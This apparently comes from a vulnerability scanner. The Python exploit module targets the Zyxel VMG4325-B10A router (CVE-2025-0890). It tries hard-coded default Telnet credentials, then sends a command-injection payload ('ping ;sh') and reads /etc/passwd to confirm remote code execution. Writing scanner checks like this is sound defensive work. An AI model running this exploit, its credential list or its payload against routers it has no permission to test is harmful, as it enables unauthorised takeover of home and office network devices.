"""Agent Asteroid implementation for CVE-2025-0890"""

import datetime
import logging
import socket
import time

from agent import definitions, exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "Zyxel VMG4325-B10A Default Credentials Leading to RCE"
VULNERABILITY_REFERENCE = "CVE-2025-0890"
VULNERABILITY_DESCRIPTION = """
The Zyxel VMG4325-B10A router is provisioned with undocumented default credentials.
The `zyuser:1234` account, while visible in the user table, is commonly left unchanged.
By leveraging these default credentials, attackers can gain authenticated access to
execute commands via a command injection vulnerability (CVE-2024-40891).
"""
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=10)
TELNET_PORT = 23
DEFAULT_CREDENTIALS = [
    ("supervisor", "zyad1234"),
    ("admin", "1234"),
    ("zyuser", "1234"),
]
COMMAND_INJECTION_PAYLOAD1 = "ping ;sh"
COMMAND_INJECTION_PAYLOAD2 = "cat /etc/passwd"


def _send_telnet_command(
    target: definitions.Target, command1: str, command2: str
) -> str:
    """
    Establishes a Telnet connection to send a command and retrieve the response.
    """
    try:
        with socket.create_connection(
            (target.host, TELNET_PORT), timeout=DEFAULT_TIMEOUT.seconds
        ) as sock:
            time.sleep(1)
            sock.sendall((command1 + "\r\n").encode())
            time.sleep(1)
            sock.sendall((command2 + "\r\n").encode())
            time.sleep(1)
            response = sock.recv(4096).decode(errors="ignore")
            return response
    except (socket.error, socket.timeout) as e:
        logging.error("Socket error while communicating with %s: %s", target.host, e)
    return ""


def _authenticate(target: definitions.Target, username: str, password: str) -> bool:
    """
    Attempts authentication using Telnet with the provided credentials.
    """
    response = _send_telnet_command(target, username, password)
    return ">" in response


@exploits_registry.register
class ZyxelDefaultCredExploit(webexploit.WebExploit):
    """
    CVE-2025-0890: Zyxel VMG4325-B10A Default Credentials Leading to RCE

    Exploit attempts to authenticate with default credentials and execute a command.
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        cve_ids=["CVE-2025-0890"],
    )

    def accept(self, target: definitions.Target) -> bool:
        """
        Check if the target responds to Telnet login prompts.
        """
        response = _send_telnet_command(target, "", "")
        return "Login:" in response

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Attempt authentication and command execution to confirm exploitability.
        """
        vulnerabilities = []

        for username, password in DEFAULT_CREDENTIALS:
            logging.info("Attempting login with %s:%s", username, password)
            if _authenticate(target, username, password) is True:
                logging.info("Successful login with %s:%s", username, password)
                response = _send_telnet_command(
                    target, COMMAND_INJECTION_PAYLOAD1, COMMAND_INJECTION_PAYLOAD2
                )
                if "admin:" in response:
                    logging.info("Command injection successful! Remote shell obtained.")
                    vulnerabilities.append(self.create_vulnerability(target))
                    return vulnerabilities

        return vulnerabilities
